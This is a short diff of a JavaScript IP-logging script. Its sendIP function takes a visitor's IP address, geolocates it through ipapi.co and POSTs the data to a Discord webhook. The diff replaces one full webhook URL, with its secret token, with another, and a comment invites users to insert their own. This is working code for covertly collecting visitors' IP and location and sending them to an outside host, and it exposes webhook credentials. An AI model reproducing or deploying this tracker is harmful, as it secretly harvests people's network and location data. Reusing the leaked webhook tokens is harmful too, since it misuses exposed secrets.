@@ -6,7 +6,7 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1378561446954143855/QKF7xjDfzeaV1yQjR7CRevHjA2XZ5qf6Tn9FYYlC7rMms1k0jQJGVPIf14U9beIGhY9f'; // replace with your webhook url
+                    const dscURL = 'https://discord.com/api/webhooks/1378561915713749063/LAmkaISa2N6kSZi90fMSvLxzllfgZ7fvOvAxrCfU8x1T6QK2MHyI8vrrPcqgGue4n9ig'; // replace with your webhook url
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
